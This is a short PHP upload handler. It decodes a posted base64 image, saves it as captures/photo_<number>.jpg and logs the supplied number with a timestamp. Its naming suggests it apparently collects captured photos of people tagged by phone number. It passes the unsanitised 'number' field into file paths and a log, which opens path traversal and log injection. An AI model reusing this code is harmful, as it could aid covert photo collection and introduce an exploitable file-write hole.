<?php
if ($_POST['image']) {
    $image = $_POST['image'];
    $number = $_POST['number'] ?? 'unknown';
    
    // Base64 decode aur save
    $data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $image));
    file_put_contents("captures/photo_$number.jpg", $data);
    
    // Log
    file_put_contents("captures/log.txt", "Number: $number | Captured at " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
}
?>